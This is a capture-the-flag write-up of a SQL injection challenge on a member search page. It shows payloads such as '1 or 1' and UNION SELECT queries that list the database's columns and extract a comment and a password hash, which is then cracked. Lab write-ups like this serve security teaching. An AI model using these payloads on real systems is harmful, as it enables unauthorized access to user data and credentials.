# Member Search

Looks like some sort of SQL injection

Entering `1 or 1` in the search field shows (I assume) all users in database:

```
ID: 1 or 1
First name: Barack Hussein
Surname : Obama

ID: 1 or 1
First name: Adolf
Surname : Hitler

ID: 1 or 1
First name: Joseph
Surname : Staline

ID: 1 or 1
First name: Flag
Surname : GetThe
```

Maybe the code looks something like this

```js
query("SELECT firstname, lastname FROM users WHERE id = " + input)
```

This gives us some good information about users

```
1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
```

```
ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : user_id

ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : first_name

ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : last_name

ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : town

ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : country

ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : planet

ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : Commentaire

ID: 1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : countersign
```

Querying `Commentaire` returns this

```
ID: 1 UNION SELECT user_id, Commentaire FROM users
First name: 5
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

And querying `countersign` returns a hashed password

```
ID: 1 UNION SELECT user_id, countersign FROM users
First name: 5
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

Pasting that hash into Google gives you `FortyTwo`
